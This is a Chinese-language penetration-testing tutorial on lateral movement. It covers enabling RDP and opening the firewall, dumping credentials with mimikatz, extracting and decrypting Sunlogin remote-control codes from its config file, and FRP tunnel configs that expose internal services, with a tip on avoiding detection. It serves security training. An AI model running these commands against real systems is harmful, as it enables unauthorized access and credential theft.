## 横向移动
---

### 1 概述

​ 在内网渗透过程中，**横向移动** 是攻击者从一台受控机器扩展到其他系统的技术。攻击者通常利用已攻陷的主机作为跳板，以获取更多系统的控制权，扩大攻击面，最终可能获取 **域控制器（Domain Controller, DC）** 的访问权限，甚至完全掌控内网。横向移动的主要目标包括：

- **域控制器（DC）**：核心目标，控制 DC 即可控制整个域环境。
- **域管理员登录过的服务器**：可能存储有管理员凭据，可用于权限提升或进一步攻击。
- **运维管理服务器**：通常存有大量管理工具和敏感信息。
- **文件服务器**：存储重要的机密文件、合同、用户信息等敏感数据。
- **数据库服务器**：包含用户数据、交易记录、业务信息等关键资产。
- **OA 系统服务器**：可能包含敏感业务流程或内部通信记录。
- **重要个人电脑**：如 CEO、CFO、CTO 等关键人员的设备，可能存有重要凭据或文件。

攻击者利用横向移动，可以绕过网络边界防护，隐蔽地逐步渗透，直至控制整个内网环境。

### **2 常见横向移动方法**

**(1) Web 漏洞利用**

攻击者利用**Web服务器**的漏洞如获取远程代码执行（RCE）等，在目标服务器上运行恶意命令或工具。例如：

- **文件包含漏洞**
- **命令执行漏洞**
- **反序列化漏洞**
- **SQL 注入**
- **弱口令或未授权访问**

**(2) 系统漏洞利用**

利用目标系统本身的安全漏洞进行攻击，如：

- **永恒之蓝（MS17-010）**：基于 SMB v1 的远程代码执行漏洞，适用于未打补丁的 Windows 系统。
- **PrintNightmare（CVE-2021-34527）**：滥用打印服务权限进行提权和远程执行代码。
- **漏洞利用工具**：Cobalt Strike、Mimikatz、Impacket 等工具可用于漏洞利用和凭据窃取。

**(3) 账号密码与身份认证攻击**

攻击者可以窃取或滥用凭据进行身份冒充：

- **PTH攻击**：使用 NTLM 哈希值直接认证，而无需知道明文密码。
- **PTT攻击**：滥用 Kerberos 票据（TGT/TGS）进行身份伪造。
- **黄金票据伪造攻击**：伪造域控制器的 TGT 票据，永久保持域管理员权限。
- **白银票据伪造攻击**：伪造特定服务的 TGS 票据，访问目标服务器。

**(4) 不安全的系统配置**

一些错误的配置可能被攻击者利用：

- **委派滥用**：利用 Kerberos 认证机制的委派特性进行身份冒充。
- **LDAP 查询**：获取域用户、计算机和组策略信息，以识别潜在攻击目标。
- **开放服务端口**：如 Telnet、FTP、VNC、MySQL、MSSQL 可能存在弱口令或未授权访问风险。

## 远控软件介绍
---

> ​ 远程控制软件（Remote Control Software）是一类用于远程访问、管理、维护目标计算机的工具，广泛应用于 IT 维护、远程运维以及渗透测试中。  
> 在网络安全攻防中，远程控制技术既是合法管理员管理服务器的必要手段，也是攻击者在获取初始访问权限后进行横向移动和权限维持的重要方式。

### 1 RDP

远程桌面协议（Remote Desktop Protocol, RDP）是微软开发的一种多通道协议，允许用户通过 GUI 远程连接和管理 Windows 计算机。广泛用于企业 IT 维护和远程办公，但由于默认配置较为宽松，常成为攻击者的目标。

#### **RDP 远程访问的基本条件**

攻击者要成功利用 RDP 进行远程连接，通常需要满足以下条件：

1. **目标主机启用了 RDP 服务（默认使用 3389 端口）**
2. **防火墙未禁用 RDP 端口（3389 端口开放）**
3. **网络连通，能够访问目标计算机**
4. **拥有有效的身份凭据（明文密码或 NTLM Hash）**

#### RDP 远程访问与攻击方式

##### 查询与启用 RDP

1）首先让域成员win2008主机在CS上线，会话间隔设置为0，如下：

![[Pasted image 20250728092920.png]]

2）接下来查看RDP端口，在cmd中使用注册表查询RDP端口（默认为3389），命令如下：

```shell
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
```

![[Pasted image 20250728093641.png]]

>返回值为16进制数，经过转换后将得到十进制端口信息

3）然后使用`netstat -ano | findstr RDP端口`检查是否有远程桌面连接、确认端口是否被占用等。如果需要结束某个使用RDP端口的进程，可以记下对应的 PID，然后使用 `taskkill /PID <进程ID> /F` 命令强制结束该进程。

```shell
# 检查 RDP 是否启用，使用 netstat 查看是否监听 3389 端口：
netstat -ano | findstr 3389
```

- `netstat -ano`：显示所有网络连接（包括 TCP 和 UDP），其中：
	- `-a` 表示显示所有连接和监听端口
	- `-n` 表示以数字形式显示地址和端口号
	- `-o` 表示显示与每个连接相关的进程 ID (PID)
- `| findstr 3389`：通过管道符 `|` 将前面命令的输出传递给 `findstr` 命令，用于筛选出包含 "3389" 的行

​倘若端口未开启，可修改注册表启用：

```shell
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

- `REG ADD`：表示要向 Windows 注册表添加一个键值
- `"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"`：指定要操作的注册表路径，这是终端服务的配置项所在位置
- `/v fDenyTSConnections`：指定要操作的注册表值名称，这个值控制是否拒绝远程桌面连接
- `/t REG_DWORD`：指定该注册表值的数据类型为 32 位二进制值
- `/d 00000000`：设置该值的数据为 0，0 表示允许远程桌面连接（1 则表示拒绝）
- `/f`：强制操作，不需要用户确认

然后重启 RDP 服务：

```shell
net start termservice
```

​如果目标开启了防火墙，还需要配置防火墙为允许远程桌面连接（或者直接关闭防火墙）：

```shell
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```
​​
- `netsh advfirewall firewall add rule`：表示使用 netsh 工具在高级防火墙中添加一条新规则
- `name="Remote Desktop"`：指定规则的名称为 "Remote Desktop"，便于识别
- `protocol=TCP`：指定该规则适用于 TCP 协议（远程桌面默认使用 TCP 协议）
- `dir=in`：表示这是一条入站规则，控制外部对本机的连接请求
- `localport=3389`：指定规则应用的本地端口为 3389（远程桌面默认端口）
- `action=allow`：指定对符合条件的连接采取允许操作

如果需要删除这条规则，可以使用以下命令： 

```shell
netsh advfirewall firewall delete rule name="Remote Desktop"
```

- `netsh advfirewall firewall delete rule`：表示使用 netsh 工具在高级防火墙中删除一条规则
- `name="Remote Desktop"`：指定规则的名称为 "Remote Desktop"，便于识别

3）抓取明文密码并登录，如果攻击者已获得系统权限，可使用 mimikatz 获取明文密码(此处需要管理员权限，可以借助CS插件`LSTAR`提升权限)，具体操作如下：

![[Pasted image 20250728104311.png]]
![[Pasted image 20250728104426.png]]
![[Pasted image 20250728140609.png]]

4）借助`mimikatz`工具抓取本地账户明文密码，命令如下：

```Cobalt Strike
mimikatz privilege::debug
mimikatz sekurlsa::logonpasswords
```

![[Pasted image 20250728104909.png]]
![[Pasted image 20250728105005.png]]

5）根据抓取的本地账户明文密码，打开访客终端输入`mstsc`启动远程。RDP远程登录操作：

![[Pasted image 20250728110211.png]]
![[Pasted image 20250728110455.png]]

>注意：登录时尽量登录非当前登录的主机用户，避免被察觉

### **2 向日葵远程控制软件**

#### **向日葵介绍**

向日葵（Sunlogin）是一款由国内厂商开发的远程控制软件，广泛用于 IT 远程运维、技术支持、企业办公等场景。其主要功能包括：

- **远程桌面控制**：支持跨平台远程访问 Windows、Mac、Linux、Android 设备。
- **文件传输**：提供远程文件管理和数据传输功能。
- **远程开机**：支持局域网内的远程唤醒。
- **命令行远程管理**：可在目标主机上执行命令操作。

#### **向日葵的安全隐患**

尽管向日葵在合法运维场景中广泛应用，但由于其远程控制能力，也常成为攻击者滥用的工具。思路：暴力破解。  
众所周知，想要通过 “向日葵” 进行远程控制，就需要获取目标的 “识别码” 与 “验证码”。那么我们这里获取远程桌面就是通过配置文件破解这两个码来进行的。  
低版本的 “向日葵”（如 11.1 版本），攻击者可以修改它的注册表使其静默运行，然后通过各种手段读取它的配置文件，进而破解上面提到的两码，然后远控。但是，时间久远，该版本的 ”向日葵“ 已经无法使用了。  
新版的向日葵，强制要求用户安装后使用（通过图形界面的形式），所以，攻击者已经无法通过命令行就让它自动上线了。但是，假设目标安装了 ”向日葵“，我们可以让其运行 + 破解密码，还是容易的。

#### **渗透测试中对向日葵的利用**

**“向日葵” —— 强制获取远程桌面**

通过 “向日葵” 远控目标第一步，就是确认目标安装了该软件。我们可以通过下面的命令来读取目标已经安装的软件信息：

```shell
powershell "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize"
```

**获取向日葵远程控制码**

​ 1）确认目标安装了向日葵后，我们就可以尝试读取 “向日葵” 的 “识别码” 与 “加密密码” 了，如果是默认安装的话（没有修改安装位置），向日葵的配置文件就在下面这个位置：

```shell
C:\ProgramData\Oray\SunloginClient\sys_config.ini
```

2）然后我们可以根据`sys_config.ini`文件的存放位置，使用`type`查看详细内容，命令如下：

```shell
type C:\ProgramData\Oray\SunloginClient\sys_config.ini
```

![[Pasted image 20250728153444.png]]

3）由回显信息中的`encry_pwd`和`fastcode`可以得到加密密码和识别码，如下：

```
提取到的信息为：

(加密密码)encry_pwd=KUk53I6P7iA=
(识别码)fastcode=k1586555315
```

![[Pasted image 20250728154259.png]]

4）对得到的加密密码使用脚本进行解密操作，成功解密后便可以正常远程访问目标计算机了。

![[Pasted image 20250728161215.png]]

## FRP内网穿透

### 基本介绍

内网穿透是一种通过公共网络（例如互联网）连接两个私有网络的技术，使得外部用户可以访问内部网络中的服务。FRP（Fast Reverse Proxy）是一种流行的内网穿透工具，其技术思想和优势如下：

#### **需求资源**

- 一台外网可访问的固定ip
- 一台外网无法访问的无固定的本地ip

将kali/自己的服务器搭建为一台内网穿透服务器，实现通过外网访问家用电脑（网页）的功能。且即使没有域名也可通过公网访问

#### **技术思想**

**反向代理（Reverse Proxy）：**
FRP利用反向代理的思想，在公共服务器上部署一个中转服务器（即FRP服务器），外部用户通过该中转服务器与内部网络建立连接。

**端口映射和流量转发：**
FRP将外部请求映射到内网机器上的指定端口，然后将流量从公网传输到内网，实现数据传输。

**心跳检测和保持连接：**
FRP通过心跳检测机制保持与客户端和服务端之间的稳定连接，确保数据传输的可靠性和稳定性。

#### **优势**

**穿透防火墙和NAT：**
FRP可以穿透防火墙和NAT设备，使得位于不同网络环境中的主机能够互相通信，解决了企业内外网络隔离的问题。

**灵活性和易用性**：
FRP配置简单灵活，支持多种协议（TCP、UDP等），可根据需求灵活配置端口映射和访问控制等参数。

**安全性**：
通过加密传输数据、访问控制列表等安全机制，保障数据传输的安全性，防止未经授权的访问。

**跨平台支持**：
FRP支持多种操作系统（Windows、Linux、Mac等），可以在不同平台上运行，并且提供了丰富的功能和插件扩展。

**开源社区支持**：   
FRP是开源项目，拥有活跃的社区支持和更新，用户可以获取最新版本、bug修复以及安全更新。

总而言之，FRP作为一种内网穿透工具，在网络通信方面具有良好的稳定性、灵活性和安全性，为用户提供了便捷的远程访问解决方案。

### 配置介绍

#### **FRP 服务端配置 (**`frps.toml`**)**

```bash
# 基础服务配置
bindPort = 7000                 # FRP 服务端监听的端口，客户端需通过此端口连接。防火墙需放行该端口。

# 管理面板配置（可选）
webServer.addr = "0.0.0.0"      # 管理后台监听地址（0.0.0.0 表示允许所有IP访问，127.0.0.1 表示仅本地访问）
webServer.port = 7500           # 管理后台访问端口
webServer.user = "admin"        # 管理后台登录用户名（可选）
webServer.password = "admin"    # 管理后台登录密码（可选）

# 安全配置（可选）
# transport.tls.force = true    # 强制使用 TLS 加密通信（需客户端同时启用）
# auth.method = 'token'         # 客户端认证方式（需与客户端一致）
# auth.token = "54321"          # 客户端认证令牌（需与客户端一致）

# HTTP/HTTPS 反向代理（可选）
# vhostHTTPPort = 8000          # HTTP 虚拟主机端口（需域名解析）
# vhostHTTPSPort = 45443        # HTTPS 虚拟主机端口（需域名和证书）
```

#### **FRP 客户端配置 (**`frpc.toml`**)**

```bash
# 基础连接配置
transport.tls.enable = true     # 启用 TLS 加密（v0.50.0+ 默认开启）
serverAddr = "47.76.92.71"     # FRP 服务端公网 IP
serverPort = 7000              # FRP 服务端端口（需与 bindPort 一致）
auth.method = 'token'          # 认证方式（需与服务端一致）
auth.token = '54321'           # 认证令牌（需与服务端一致）

# 代理规则配置
# 示例1：暴露本地 MySQL 服务到公网
[[proxies]]
name = "dy_mysql"              # 代理名称（唯一标识）
type = "tcp"                   # 代理类型（TCP/UDP/HTTP/HTTPS）
localIP = "127.0.0.1"          # 本地服务 IP（127.0.0.1 表示本机）
localPort = 3306               # 本地服务端口（MySQL 默认端口）
remotePort = 13306             # 服务端暴露的端口（需放行防火墙）

# 示例2：暴露内网摄像头服务
[[proxies]]
name = "dy_video"              # 代理名称
type = "tcp"                   # TCP 协议
localIP = "192.168.6.8"        # 内网设备 IP
localPort = 5522               # 内网服务端口
remotePort = 15522             # 公网访问端口

# 示例3：暴露本地 9000 端口到公网 6060
[[proxies]]
name = "test-tcp"              # 代理名称
type = "tcp"                   # TCP 协议
localIP = "127.0.0.1"          # 本地服务 IP
localPort = 9000               # 本地服务端口
remotePort = 6060              # 公网访问端口

# 示例4：暴露 SSH 服务
[[proxies]]
name = "ssh"                   # 代理名称
type = "tcp"                   # TCP 协议
localIP = "127.0.0.1"          # 本地 SSH IP
localPort = 22                 # SSH 默认端口
remotePort = 6000              # 公网访问端口

# 示例5：HTTP 反向代理（需域名）
[[proxies]]
name = "web"                   # 代理名称
type = "http"                  # HTTP 协议
localIP = "127.0.0.1"          # 本地 Web 服务 IP
localPort = 80                 # HTTP 默认端口
customDomains = ["域名或ip"]    # 绑定的域名或IP（需DNS解析）
```

